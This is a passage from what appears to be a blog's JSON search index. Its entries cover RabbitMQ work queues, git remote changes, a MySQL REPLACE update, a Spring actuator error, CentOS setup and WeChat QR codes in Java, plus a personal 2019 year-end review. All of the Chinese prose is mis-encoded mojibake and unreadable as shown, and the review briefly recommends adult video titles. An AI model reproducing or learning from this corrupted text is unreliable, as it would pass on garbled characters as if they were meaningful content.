channel.queueDeclare().getQueue();","categories":[],"tags":[{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"http://yoursite.com/tags/RabbitMQ/"},{"name":"rabbitmq","slug":"rabbitmq","permalink":"http://yoursite.com/tags/rabbitmq/"}]},{"title":"RabbitMQ-å·¥ä½œé˜Ÿåˆ—","slug":"RabbitMQ-å·¥ä½œé˜Ÿåˆ—","date":"2020-02-29T14:15:17.000Z","updated":"2020-11-14T17:10:46.923Z","comments":true,"path":"2020/02/29/RabbitMQ-å·¥ä½œé˜Ÿåˆ—/","link":"","permalink":"http://yoursite.com/2020/02/29/RabbitMQ-%E5%B7%A5%E4%BD%9C%E9%98%9F%E5%88%97/","excerpt":"","text":"ä»‹ç»RabbitMQæ˜¯æ¶ˆæ¯ä»£ç†ã€‚å®ƒæ¥æ”¶ä¿¡æ¯å’Œè½¬å‘ä¿¡æ¯ã€‚ä½ å¯ä»¥æŠŠä»–è€ƒè™‘æˆä¸€ä¸ªé‚®å±€ã€‚å½“ä½ è®²é‚®å¯„çš„ä¿¡æ”¾åœ¨é‚®å±€æ—¶ï¼Œä½ å¯ä»¥ç¡®å®šé‚®å·®å…ˆç”Ÿæˆ–è€…å¥³å£«ä¼šæŠŠé‚®ä»¶æœ€ç»ˆé€åˆ°ä½ çš„æ”¶ä»¶äººæ‰‹ä¸­ã€‚å½“ç„¶é‚®å±€å’ŒRabbitMQæœ€å¤§çš„åŒºåˆ«ï¼ŒRabbitMqä¸æ¥å—çº¸å¼ ï¼Œå®ƒåªæ¥æ”¶ï¼Œå­˜å‚¨ï¼Œè½¬å‘äºŒè¿›åˆ¶çš„æ•°æ®æ¶ˆæ¯å¿«ã€‚ ä¸‹é¢è®²ä¸€äº›RabbitMQä¸­çš„æœ¯è¯­ï¼š Producer ç”Ÿæˆåªä¸è¿‡æ„å‘³ç€å‘é€ä¿¡æ¯ã€‚å‘é€ä¿¡æ¯çš„ç¨‹åºæ˜¯ç”Ÿäº§è€… Queue é˜Ÿåˆ—æ˜¯é©»ç•™åœ¨RabbitMQå†…çš„é‚®ç®±çš„åç§°ã€‚å°½ç®¡æ¶ˆæ¯flowRabbitMQå’Œä½ çš„ç¨‹åºï¼Œä½†æ˜¯ä»–ä»¬åªèƒ½å­˜å‚¨åœ¨é˜Ÿåˆ—ä¸­ã€‚ä¸€ä¸ªé˜Ÿåˆ—åªå—ä¸»æœºçš„å†…å­˜å’Œç£ç›˜é™åˆ¶ï¼Œå®ƒçš„æœ¬è´¨æ˜¯ä¸€ä¸ªå¤§çš„æ¶ˆæ¯ç¼“å†²åŒºã€‚è®¸å¤šæ¶ˆè´¹è€…å¯ä»¥å°†æ¶ˆæ¯å‘é€åˆ°ä¸€ä¸ªé˜Ÿåˆ—ï¼Œè®¸å¤šæ¶ˆè´¹è€…å¯ä»¥å°è¯•ä»ä¸€ä¸ªé˜Ÿåˆ—æ¥æ”¶æ•°æ®ï¼Œè¿™å°±æˆ‘ä»¬è¡¨ç¤ºé˜Ÿåˆ—çš„æ–¹å¼ã€‚ Consumer æ¶ˆè´¹å’Œæ¥æ”¶æœ‰ç›¸åŒçš„æ„ä¹‰ã€‚æ¶ˆè´¹è€…æ˜¯ä¸€ä¸ªä¸»è¦æ¥æ”¶æ¶ˆæ¯çš„ç¨‹åº æ³¨æ„ï¼šç”Ÿäº§è€…ã€æ¶ˆè´¹è€…å’Œä»£ç†ä¸å¿…éƒ½åœ¨åŒä¸€ä¸»æœºä¸Šï¼›å®é™…ä¸Šï¼Œåœ¨å¤§å¤šæ•°åº”ç”¨ç¨‹åºä¸­ï¼Œå®ƒä»¬å¹¶æ²¡æœ‰è¿™æ ·åšã€‚åº”ç”¨ç¨‹åºæ—¢å¯ä»¥æ˜¯ç”Ÿæˆè€…ä¹Ÿå¯ä»¥æ˜¯æ¶ˆè´¹è€…ã€‚ ç®€å•é˜Ÿåˆ—ç®€å•é˜Ÿåˆ—ï¼Œå°±æ˜¯å‘é€å•ä¸ªæ¶ˆæ¯çš„æ¶ˆè´¹è€…å’Œæ¥æ”¶ä¿¡æ¯å¹¶å°†å…¶æ‰“å°å‡ºæ¥çš„ä½¿ç”¨è€…ï¼ˆæ¶ˆè´¹è€…ï¼‰ï¼Œä¸å¤šå™è¿°ã€‚ å·¥ä½œé˜Ÿåˆ—å·¥ä½œé˜Ÿåˆ—ä¸»è¦æ˜¯é¿å…çŸ­æ—¶é—´å†…æ‰§è¡Œå¯†é›†ä»»åŠ¡ï¼Œå¹¶ä¸”å¿…é¡»ç­‰å¾…å®ƒå®Œæˆã€‚æˆ‘ä»¬å°†ä»»åŠ¡æ”¾åœ¨æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œå¯åŠ¨å¤šä¸ªæ¶ˆè´¹è€…ï¼Œä»»åŠ¡åœ¨ä»–ä»¬ä¸­æ˜¯å…±äº«çš„ã€‚ è®¾è®¡åˆ°å·¥ä½œé˜Ÿåˆ—ï¼Œå½“ç„¶ä¼šæœ‰ä¸åŒæ–¹å¼çš„å·¥ä½œé˜Ÿåˆ— ackå…³äº ack è¿™è¾¹å¤šè®²ä¸€ç‚¹ï¼Œ message acknowledgment æ˜¯æ¶ˆæ¯ç¡®è®¤ï¼Œè®¾ç½® autoack=trueä¹‹åï¼Œconsumerè¿”å›ä¸€ä¸ªackï¼ˆnowledgementï¼‰,å‘Šè¯‰ rabbitMQ å·²ç»æ¥å—ä¿¡æ¯ï¼Œå¤„ç†äº†ç‰¹å®šçš„æ¶ˆæ¯ï¼Œ RabbitMQå¯ä»¥è‡ªç”±åœ°åˆ é™¤å®ƒã€‚ è½®è¯¢é˜Ÿåˆ—ï¼ˆRound-robin dispatchingï¼‰å°† autoAck è®¾ç½®ä¸º true,é»˜è®¤æƒ…å†µä¸‹ï¼ŒRabbitMQä¼šå‘é€æ¯æ¡ä¿¡æ¯ç»™å¦ä¸€ä¸ªæ¶ˆè´¹è€…ã€‚æ¯ä¸ªæ¶ˆè´¹è€…éƒ½ä¼šè·å–ç›¸åŒæ•°é‡çš„ã€‚å¹¶ä¸”æ˜¯é—´éš”å½¢å¼çš„ã€‚å¦‚æœ‰c1,c2æ¶ˆè´¹è€…ï¼Œ10æ¡æ¶ˆæ¯ï¼Œc1æ˜¯0,2,4,6,8ï¼Œc2æ˜¯1,3,5,7,9ã€‚å½“ç„¶ï¼Œåœ¨æˆ‘æ‰“æ–­ç‚¹æ—¶ï¼Œå‘ç°å¯¹åº”çš„æ•°æ®ä¼šéƒ½ä¸€æ¬¡æ€§å‘é€åˆ°c1ï¼Œå’Œc2ï¼Œc1å’Œc2å¤„ç†ä¿¡æ¯æ—¶ï¼Œå¹¶ä¸å½±å“å½¼æ­¤ã€‚ å…¬å¹³é˜Ÿåˆ—åœ¨ RabbitMQ åˆ†å‘ä¿¡æ¯çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šå‘ç°ï¼Œä¸€ä¸ªconsumerå¾ˆå¿™ï¼Œå¦ä¸€ä¸ªä¸€ç‚¹ä¹Ÿä¸å¿™ã€‚å› ä¸º RabbitMQå¯¹æ­¤ä¸€æ— æ‰€çŸ¥ï¼Œåªæ˜¯å°†ç¬¬Næ¡ä¿¡æ¯ï¼Œå‘é€ç»™ç¬¬Nconsumer. ä¸ºäº†è§£å†³è¿™ä¸ªï¼Œæˆ‘ä»¬å°†basicQosæ–¹æ³•å’ŒprefetechCount=1è®¾ç½®ä¸€èµ·ç”¨ã€‚æ¢å¥è¯è¯´ï¼Œåœ¨å¤„ç†å¹¶ç¡®è®¤ä¸Šä¸€æ¡ä¿¡æ¯ä¹‹å‰ï¼Œä¸è¦å°†æ–°ä¿¡æ¯å‘é€ç»™å·¥äººã€‚ int prefetchCount = 1; channel.basicQos(prefetchCount);å¹¶ä¸”ï¼Œæˆ‘ä»¬éœ€è¦å°†autoAckè®¾ä¸ºfalseå’Œå¤„ç†å®Œä¸€æ¡æ¶ˆæ¯åå‘é€ackç»™ RabbitMQ DefaultConsumer defaultConsumer = new DefaultConsumer(channel){ @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { String msg = new String(body, &quot;utf-8&quot;); System.out.println(&quot;receive1 : &quot; + msg); try { Thread.sleep(2000); } catch (InterruptedException e) { e.printStackTrace(); }finally { channel.basicAck(envelope.getDeliveryTag(),false); } } }; boolean autoack = false; channel.basicConsume(QUEUE_NAME,autoack,defaultConsumer);","categories":[],"tags":[{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"http://yoursite.com/tags/RabbitMQ/"},{"name":"erlang","slug":"erlang","permalink":"http://yoursite.com/tags/erlang/"}]},{"title":"gitä¿®æ”¹è¿œç¨‹ä»“åº“","slug":"gitä¿®æ”¹è¿œç¨‹ä»“åº“","date":"2020-02-10T08:08:23.000Z","updated":"2020-11-14T17:10:47.390Z","comments":true,"path":"2020/02/10/gitä¿®æ”¹è¿œç¨‹ä»“åº“/","link":"","permalink":"http://yoursite.com/2020/02/10/git%E4%BF%AE%E6%94%B9%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/","excerpt":"","text":"èµ·å› å…¬å¸ç”¨çš„æ‰˜ç®¡ä»“åº“æ˜¯codingï¼Œç„¶åä»Šå¤©ä»“åº“åœ°å€æ¢äº†ï¼Œæ›´æ–°é¡¹ç›®æ—¶ï¼Œæç¤ºæŠ¥é”™ï¼Œé‚æ›´æ–°è¿œç¨‹ä»“åº“ Coding æç¤º: Public key expired. æ­¤å…¬é’¥å·²ç»è¶…è¿‡æœ‰æ•ˆæœŸï¼Œè¦ç»§ç»­ä½¿ç”¨è¯·åˆ° https://coding.net/user/account/setting/keys æ›´æ”¹è®¾ç½®ã€‚ fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists.è§£å†³æ–¹æ¡ˆå…ˆæ›´æ–°äº†ä¸€ä¸‹é¡¹ç›®ä¸­ssh keyçš„æœ‰æ•ˆæœŸï¼Œæˆ‘å°±è®¾ç½®æˆäº†æ°¸ä¹…æœ‰æ•ˆ ç„¶åä¿®æ”¹è¿œç¨‹ä»“åº“åœ°å€ # åˆ é™¤å½“å‰è¿œç¨‹ä»“åº“åœ°å€ git remote rm origin # æ·»åŠ è¿œç¨‹ä»“åº“ git remote add origin [url] # è®©æœ¬åœ°èƒ½å¤Ÿè¯»å–è¿œç¨‹çš„åˆ†æ”¯ï¼Œä»¥ä¾¿åç»­track git fetch # æœ¬åœ°è¿½è¸ªè¿œç¨‹ git branch --set-upstream-to=origin/master masteræ ¹æ®ä»¥ä¸Šæ“ä½œï¼Œåº”è¯¥å°±ä¼šå¥½äº†","categories":[],"tags":[{"name":"git","slug":"git","permalink":"http://yoursite.com/tags/git/"}]},{"title":"sql replace","slug":"sql replace","date":"2020-01-18T07:51:42.000Z","updated":"2020-11-14T17:10:47.868Z","comments":true,"path":"2020/01/18/sql replace/","link":"","permalink":"http://yoursite.com/2020/01/18/sql%20replace/","excerpt":"","text":"sqlæ›¿æ¢èµ·å› ä¸ƒç‰›äº‘ä¸Šä¼ å›¾ç‰‡çš„è¿”å›æ—¶ï¼Œå‰ç«¯æ‹¼æ¥äº†åŸŸåï¼Œå¯¼è‡´å›¾ç‰‡ä¿å­˜æ—¶ï¼Œæ˜¯å…¨åŸŸåï¼Œä¾‹å¦‚ http://example.com/a.jpg å‡ºç°ä¸€ä¸ªé—®é¢˜ï¼ŒåŸŸåå¿«è¦åˆ°æœŸäº†ï¼Œéœ€è¦æ›´æ¢åŸŸåï¼Œæ•°æ®åº“ä¸­ä¿å­˜çš„æ•°æ®éœ€è¦æ›´æ¢æˆæ–°çš„åŸŸå æ‰¾åˆ°çš„ç­”æ¡ˆUPDATE your_table SET your_field = REPLACE(your_field, &apos;articles/updates/&apos;, &apos;articles/news/&apos;) WHERE your_field LIKE &apos;%articles/updates/%&apos; ç­”æ¡ˆåœ°å€ å®é™…åº”ç”¨UPDATE banner SET img_url = REPLACE(img_url, &apos;http://example.com&apos;, &apos;http://google.com&apos;) WHERE img_url like &apos;http://example.com%&apos;;","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"springcloudä¸­ç»“åˆactuatorä¸æ”¯æŒ_actuator_refresh","slug":"springcloudä¸­ç»“åˆactuatorä¸æ”¯æŒ_actuator_refresh","date":"2020-01-17T02:55:46.000Z","updated":"2020-11-14T17:10:48.597Z","comments":true,"path":"2020/01/17/springcloudä¸­ç»“åˆactuatorä¸æ”¯æŒ_actuator_refresh/","link":"","permalink":"http://yoursite.com/2020/01/17/springcloud%E4%B8%AD%E7%BB%93%E5%90%88actuator%E4%B8%8D%E6%94%AF%E6%8C%81_actuator_refresh/","excerpt":"","text":"èµ·å› å› ä¸ºspringcloud config é‡Œé¢éœ€è¦è·å–åˆ·æ–°é…ç½®æ—¶ï¼Œåœ¨è®¿é—®æµè§ˆå™¨ http://localhost:13000/actuator/refresh æ—¶ï¼Œå‘ç°å‡ºé”™ã€‚ æ’æŸ¥Whitelabel Error Page This application has no configured error view, so you are seeing this as a fallback. Fri Jan 17 10:40:30 CST 2020 [2d29c4d7] There was an unexpected error (type=Method Not Allowed, status=405). Request method &apos;GET&apos; not supportedæµè§ˆå™¨æŠ¥é”™ï¼Œå‡ºç° Request method &#39;GET&#39; not supported ,ä¸æ”¯æŒ GETè¯·æ±‚ï¼Œå¯æƒœï¼Œæˆ‘ç¬¬ä¸€æ¬¡å‡ºé”™çš„æ—¶å€™ï¼Œæ²¡æœ‰ä»”ç»†çœ‹æŠ¥é”™ä¿¡æ¯ã€‚ èµ°å¼¯è·¯é¦–å…ˆï¼Œæˆ‘æ”¾å¼€äº† actuator çš„æ‰€æœ‰è·¯å¾„ management: endpoints: web: exposure: include: &quot;*&quot;å†è®¿é—® localhost:13000/actuator å¯ä»¥çœ‹åˆ°ï¼Œé‡Œé¢æœ‰refresh &quot;refresh&quot;: { &quot;href&quot;: &quot;http://localhost:13000/actuator/refresh&quot;, &quot;templated&quot;: false }åæ¥åˆåœ¨githubä¸Šæ‰¾åˆ°äº†ç›¸ä¼¼çš„é—®é¢˜ https://github.com/spring-projects/spring-boot/issues/10829 é‡Œé¢æåˆ°äº† /actuator/refresh ä¸æ”¯æŒ GET ,æ”¯æŒ POST","categories":[],"tags":[{"name":"spring cloud","slug":"spring-cloud","permalink":"http://yoursite.com/tags/spring-cloud/"}]},{"title":"2019å¹´å¹´åº¦æ€»ç»“","slug":"2019å¹´å¹´åº¦æ€»ç»“","date":"2019-12-18T10:06:19.000Z","updated":"2020-11-14T17:10:49.478Z","comments":true,"path":"2019/12/18/2019å¹´å¹´åº¦æ€»ç»“/","link":"","permalink":"http://yoursite.com/2019/12/18/2019%E5%B9%B4%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/","excerpt":"","text":"ä»Šå¹´å¤§è‡´åšäº†ä»€ä¹ˆ2018.12-2019.02è¿™æ®µæ—¶é—´åœ¨ä¸Šæµ·ä¸€å®¶20ä¸ªäººçš„æ¸¸æˆå…¬å¸ï¼Œæ—©ä¸Šåƒç½—æ£®çš„åŒ…å­ï¼Œå–è±†æµ†ï¼Œå‚ä¸äº†çº¢åŒ…é¡¹ç›®ã€‚å…¬å¸æ¶æ„æ˜¯åç«¯springboot+Netty,å‰ç«¯Unity3D.å·¥ä½œåˆ°2æœˆåº•ã€‚å°è±¡æ¯”è¾ƒæ·±çš„æ˜¯ï¼Œå…¬å¸æœ‰åªå…”å­ï¼Œæ¯å¤©å°±æ˜¯åƒåƒï¼Œè€Œä¸”ç¦»æˆ‘ä»¬è¿‘ï¼Œå¥½è‡­ï¼Œæœ‰å‡ æ¬¡ï¼Œå‘¨æœ«æ²¡äººåœ¨ï¼Œå…”å­ç«Ÿç„¶å°±æ²¡åƒï¼Œæ˜ŸæœŸä¸€å»çš„æ—¶å€™ï¼Œå…”å­å’Œç–¯å­ä¸€æ ·ï¼Œæœ€åä¹Ÿä¸çŸ¥é“ï¼Œå…”å­æœ‰æ²¡æœ‰æˆçº¢çƒ§å…”å­ã€‚å­¦æ ¡è®©å›å»æ¯•ä¸šè®¾è®¡ï¼Œäºæ˜¯ç¦»èŒã€‚ 2019.03-2019.06è¿™æ®µæ—¶é—´åœ¨å­¦æ ¡è¿‡äº†ä¸€æ®µæœ€é€é¥è‡ªåœ¨çš„æ—¥å­ï¼Œæ¯å¤©ç¡åˆ°è‡ªç„¶é†’ï¼ˆå½“ç„¶ç°åœ¨å·¥ä½œä¹Ÿæ˜¯ç¡åˆ°è‡ªç„¶é†’ï¼‰ï¼Œè¿™æ®µæ—¶é—´å­¦ä¹ äº†Vue,å¹¶å®Œæˆäº†æ¯•ä¸šè®¾è®¡,ã€ŠåŸºäºSpringboot+Vueå®ç°çš„H5ç½‘ä¸Šå•†åŸã€‹ï¼Œæ—¶é—´è¿˜æ˜¯è›®ç´§å‡‘çš„ï¼Œå¿«åˆ°ç­”è¾©çš„æ—¶å€™æ‰å®Œæˆã€‚å½“ç„¶å†™æ¯•ä¸šè®¾è®¡ä¸æ˜¯æœ€ä¸»è¦çš„ï¼Œè€Œæ˜¯å†™è®ºæ–‡æ‰æ˜¯æœ€ä¸»è¦ï¼Œä½ å¾—å†™åˆ°é‡å¤ç‡ä¸é«˜ã€‚åé¢ç­”è¾©æ˜¯ä¸€æ¬¡é€šè¿‡çš„ã€‚ 2019.06-2019-12è¿™æ®µæ—¶é—´ï¼Œç¦»å¼€å­¦æ ¡åï¼Œå°±æ¥åˆ°äº†è‹å·ï¼Œåªèƒ½è¯´ç©ºæ°”ç¯å¢ƒå¥½ï¼ˆæˆ‘æ˜¯æŒ‡å·¥ä¸šå›­åŒºè¿™è¾¹ï¼‰ï¼Œè¿™è¾¹èœä¹ŸæŒºå¥½çš„ã€‚ç°åœ¨åœ¨åšä¸€ä¸ªæ—¥æœ¬æœè£…å“ç‰Œçš„å¤–åŒ…ï¼Œå°ç¨‹åºå’ŒAPPéƒ½åœ¨åšã€‚åœ¨è¿™è¾¹ä¸»è¦ä½¿ç”¨Java,å¶å°”ä¹Ÿéœ€è¦ä½¿ç”¨Phpæ¥å†™ä¸œè¥¿ã€‚å‚ä¸äº†å¾ˆå¤šå°é¡¹ç›®ï¼Œä¹Ÿç»å†ä¸å°‘äº‹ã€‚åªèƒ½è¯´ï¼Œä»¥å‰å¤©çœŸçš„æˆ‘ï¼Œç¼ºä¹ç¤¾ä¼šæ¯’æ‰“ã€‚ ä»Šå¹´gitæ´»è·ƒåº¦ ç¬¬ä¸€å¼ æ˜¯6æœˆä¹‹åæ–°å…¬å¸çš„è®°å½•ï¼Œç¬¬äºŒå¼ æ˜¯githubä¸Šçš„ä¸Šé¢çš„ï¼Œè¿˜æœ‰ä¹‹å‰å…¬å¸çš„è®°å½•æ²¡æ³•æ‰¾äº† ä»Šå¹´å­¦ä¹ çš„æ–°æŠ€èƒ½ çœ‹å®Œäº† çº¿ç¨‹ç›¸å…³çš„ä¹¦ï¼ˆæ±ªæ–‡å›ã€é‚£ä¸ªé˜¿é‡Œç³»çš„äººå†™åˆ°ï¼‰ï¼Œçœ‹å®Œå°±å¿˜äº†ã€‚ çœ‹äº†ä¸€ç‚¹Nettyçš„ä¹¦å’Œè®°å½•ï¼Œå¤§è‡´äº†è§£Netty,ä¹Ÿå­¦ä¹ äº†ç½‘ç»œé€šä¿¡ç›¸å…³ ä½¿ç”¨rediså¼€å‘ï¼Œä¹Ÿåªæ˜¯å†°å±±ä¸€è§’ å…³äºlinuxç›¸å…³ï¼Œé˜…è¯»äº†ç›¸å…³æ•°æ®ï¼Œä¸ç®—ç†Ÿç»ƒ ä»Šå¹´æ¸¸æˆè®°å½• ç‹è€…å·²ç»èƒ½å¤šæ¬¡å•æ’åˆ°ç‹è€…ï¼Œå·…å³°èµ›æœ€é«˜1458ã€‚æœ€åå‘ç°æ¸¸æˆæ”¹äº†é¢ç›®å…¨éï¼Œä¸æƒ³ç©äº† ç©äº†è‹±é›„è”ç›Ÿï¼Œè¿˜æ˜¯ä¸é€‚åº” ç©äº†çœ‹é—¨ç‹—ï¼Œçˆ½ï¼Œå°±æ˜¯å®¹æ˜“è¿·å¤±ä»»åŠ¡ ç©äº†csgoï¼Œçˆ½å•Šï¼ŒçœŸé€‚åˆæˆ‘è¿™æ ·çš„äººç©ï¼Œç©ç©ä¼‘é—²æ¨¡å¼ ä»Šå¹´çœ‹ç‰‡æŒ‡å¯¼å•èº«ç‹—åªèƒ½é çœ‹ç‰‡æ¥ç»´æŒç”Ÿæ´»äº†ï¼Œä»Šå¹´æ—¥æœ¬æ¨å‡ºäº†ä¸å°‘å¥½çœ‹çš„ç‰‡ ipxç³»åˆ—ï¼Œæˆ‘åªèƒ½è¯´ï¼Œæ‹æ‘„æ‰‹æ³•å¾ˆå¥½çœ‹ï¼Œipx177ç›¸å…³çš„ï¼Œå¾ˆå¥½çœ‹ æœ‰å¾ˆå¤šï¼Œä¹Ÿä¸å¥½ä¸€ä¸€ç‚¹è¯„ï¼Œä½†æ˜¯ç¡®å®å¥½çœ‹çš„å¾ˆå¤šä»Šå¹´ã€‚ ä»Šå¹´çš„æ„Ÿæƒ…ç”Ÿæ´»è¿˜æ˜¯ç©ºç©ºå¦‚ä¹Ÿï¼Œ0åˆ†ã€‚åªæœ‰ç”Ÿç—…çš„æ—¶å€™ï¼Œå’Œä¸€ä¸ªäººæ— èŠçš„æ—¶å€™æ‰ä¼šæƒ³æ‰¾ä¸ªå¥³æœ‹å‹ã€‚æœŸå¾…æ˜å¹´èƒ½é‡è§ä¸ªå¦¹å­ã€‚ æ¢¯é˜Ÿ 1.ä¸‰è§‚2.é•¿ç›¸3.ç­‰ç­‰ å¹´åº¦æ„Ÿæƒ³ äººçš„ç”Ÿå‘½å¾ˆçŸ­ï¼Œæ´»åœ¨å½“ä¸‹ã€‚æ¯ä¸ªæœˆçš„å·¥èµ„å‘ä¸‹æ¥ï¼Œè¯¥ç”¨å°±ç”¨ï¼Œç»™çˆ¶æ¯ä¹°ç‚¹ä¸œè¥¿ï¼Œå¯„ç‚¹é’±ã€‚ ä»Šå¹´çš„å¤§ç¯å¢ƒæ„Ÿè§‰å°±æ˜¯ä¸­ç¾å¯¹æŠ—ï¼Œç„¶åITè¡Œä¸šå¥½å¤šå…¬å¸è£å‘˜ã€‚çœŸçš„æ˜¯å‡›å†¬å°†è‡³ æ˜å¹´å±•æœ› äº¤ä¸ªå¥³æœ‹å‹ å¤šå¤šé”»ç‚¼ å»å¦ä¸€ä¸ªåŸå¸‚ï¼Œè¯´ä¸å®šæˆ‘ä¼šå›ä¸Šæµ·ï¼Œæˆ–è€…å»æ­å· æŒ£é’±è®©çˆ¶æ¯ä»–ä»¬å»æ—…æ¸¸ åŠªåŠ›å­¦ä¹ ","categories":[],"tags":[{"name":"ç”Ÿæ´»","slug":"ç”Ÿæ´»","permalink":"http://yoursite.com/tags/%E7%94%9F%E6%B4%BB/"}]},{"title":"vmwareå®‰è£…centos7å¹¶å¼€å¯ssh","slug":"vmwareå®‰è£…centos7å¹¶å¼€å¯ssh","date":"2019-12-09T15:50:07.000Z","updated":"2020-11-14T17:10:49.942Z","comments":true,"path":"2019/12/09/vmwareå®‰è£…centos7å¹¶å¼€å¯ssh/","link":"","permalink":"http://yoursite.com/2019/12/09/vmware%E5%AE%89%E8%A3%85centos7%E5%B9%B6%E5%BC%80%E5%90%AFssh/","excerpt":"","text":"åŸç”±è®°å½•å®‰è£…centos7ï¼Œç”±äºè¦ç”¨åˆ°dockerå’Œelasticsearch ä¸‹è½½è·¯å¾„vmware : https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html centos7é•œåƒ: https://www.jianshu.com/p/a63f47e096e8 centos7å®‰è£…æ•™ç¨‹: https://blog.csdn.net/vevenlcf/article/details/78297008vmvare å¯†é’¥ å¯†é’¥ centoså®‰è£…centos7æ¨èä½¿ç”¨englishï¼Œç„¶åä½¿ç”¨å‘½ä»¤è¡Œå½¢å¼å®‰è£… centos ç½‘ç»œç”±äºåˆšè£…å¥½çš„centosæ— æ³•è”ç½‘ï¼Œæ‰€ä»¥éœ€è¦é…ç½®ç½‘ç»œ æ¨èåšæ–‡ ï¼Œé€šè¿‡é˜…è¯»æ–‡æ¡£ï¼Œæ‰¾åˆ° gateway,ç„¶åæ“ä½œæ–‡ä»¶ vi /etc/sysconfig/network-scripts/ifcfg-ens33i BOOTPROTO=static#å¯ç”¨é™æ€IPåœ°å€ ONBOOT=yes #å¼€å¯è‡ªåŠ¨å¯ç”¨ç½‘ç»œè¿æ¥ IPADDR=192.168.1.73 # éœ€è¦å’Œgatewayä¸åŒï¼Œä½ å¯ä»¥éšä¾¿å†™ï¼Œæœ€åä¸€ä¸ªæ•°å­—ä¸ä¸€æ · GATEWAY=192.168.1.1 # ç½‘ç®¡éœ€è¦é€‚åº”æœ¬æœº NETMASK=255.255.255.0 DNS1=114.114.114.114 DNS2=8.8.8.8:wq æµ‹è¯• service network restart é‡å¯ç½‘ç»œ ping www.baidu.com æµ‹è¯• å¼€å¯ssh å…·ä½“æ–‡æ¡£ æœ¬äººæ¯”è¾ƒå–œæ¬¢é€‚åº”xshellæ¥æ¥è§¦ç½‘ç»œ","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"å¾®ä¿¡è·å–å°ç¨‹åºç ","slug":"å¾®ä¿¡è·å–å°ç¨‹åºç ","date":"2019-11-26T03:44:48.000Z","updated":"2020-11-14T17:10:50.912Z","comments":true,"path":"2019/11/26/å¾®ä¿¡è·å–å°ç¨‹åºç /","link":"","permalink":"http://yoursite.com/2019/11/26/%E5%BE%AE%E4%BF%A1%E8%8E%B7%E5%8F%96%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%A0%81/","excerpt":"","text":"å¾®ä¿¡å°ç¨‹åºè·å–å°ç¨‹åºç çš„æ— é™åˆ¶æ¥å£æ˜¯è¿”å›äºŒè¿›åˆ¶å†…å®¹ è¯·æ±‚å¾®ä¿¡æ¥å£è·å–å­—èŠ‚æ•°ç»„byte[] public byte[] getQrCodeUnlimited(String scene,String page){ // è·å–access_token è¯·è‡ªå·±å°è£… String accessToken = getAccessToken(); Map&lt;String,String&gt; params = new HashMap&lt;&gt;(3); params.put(&quot;scene&quot;,scene); params.put(&quot;page&quot;,page); try { byte[] buffer = HttpClientUtil.doJsonPostRawResponse(&quot;https://api.weixin.qq.com/wxa/getwxacodeunlimit?access_token=&quot; + accessToken, null, params); return buffer; }catch (Exception e){ e.printStackTrace(); return null; } } // æ­¤å¤„çš„httpUtilæ˜¯æˆ‘è‡ªå·±å°è£…çš„ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨[wxJava](https://github.com/Wechat-Group/WxJava)é‡Œé¢çš„å°ç¨‹åºè·å–byteæ•°ç»„çš„æ–¹æ³•è·å–ï¼Œç¬¬äºŒç§æ²¡æœ‰å°è¯•è¿‡é€šè¿‡springmvcè¾“å‡ºå‡ºå»@RequestMapping(&quot;/qrcode&quot;) @RestController public class QrCodeController { @Autowired private WechatUtil wechatUtil; // è¿™ä¸ªæ–¹æ³•å¯ä»¥å®ç°ï¼Œååˆ†ç®€å• @RequestMapping(&quot;/unlimted&quot;) public void getQrcodeUnlimted(@RequestParam(value = &quot;page&quot;,required = false)String page,@RequestParam(value = &quot;sid&quot;,required = false)String sid, HttpServletResponse response) throws IOException { sid = URLDecoder.decode(sid,&quot;UTF-8&quot;); String scene = sid; byte[] buffer = wechatUtil.getQrCodeUnlimited(scene,page); response.setContentType(&quot;image/jpeg&quot;); OutputStream outputStream = response.getOutputStream(); outputStream.write(buffer); outputStream.flush(); outputStream.close(); } // ä¸‹é¢è¿™ä¸ªæ–¹æ³•ï¼Œä¹Ÿå¯ä»¥å®ç° @RequestMapping(&quot;/unlimted2&quot;) public ResponseEntity&lt;byte[]&gt; getQrcodeUnlimted2(@RequestParam(value = &quot;page&quot;,required = false)String page, @RequestParam(value = &quot;sid&quot;,required = false)String sid, HttpServletResponse response) throws IOException { sid = URLDecoder.decode(sid,&quot;UTF-8&quot;); String scene = sid; byte[] buffer = wechatUtil.getQrCodeUnlimited(scene,page); HttpHeaders headers = new HttpHeaders(); headers.setCacheControl(CacheControl.noCache().getHeaderValue()); headers.setContentType(MediaType.IMAGE_JPEG); ResponseEntity&lt;byte[]&gt; responseEntity = new ResponseEntity&lt;byte[]&gt;(buffer,headers,HttpStatus.OK); return responseEntity; } }å‰ç«¯å¯ä»¥é€šè¿‡ä¿®æ”¹srcé‡Œé¢çš„å€¼æ¥ä¿®æ”¹&lt;img src=&quot;data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAAUA AAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO 9TXL0Y4OHwAAAABJRU5ErkJggg==&quot; alt=&quot;Red dot&quot; /&gt;å…·ä½“å¯ä»¥å‚è€ƒ base64å›¾ç‰‡ ä¸­çš„é«˜åˆ†ç­”æ¡ˆ æ€»ç»“è¿™ç»ˆç©¶æ˜¯ä»¥IOæ“ä½œï¼Œè¿”å›æµæ—¶ï¼ŒåŠ äº†å¤´éƒ¨ä¿¡æ¯image/jpeg ä¸å¤šbbï¼Œæˆ‘å»å½“ç¤¾ç•œäº†ï¼Œå¦‚æœæœ‰éœ€è¦å·¥å…·åŒ…çš„å¯ä»¥è¯„è®ºã€‚","categories":[],"tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"},{"name":"springboot","slug":"springboot","permalink":"http://yoursite.com/tags/springboot/"},{"name":"Javaå­¦ä¹ 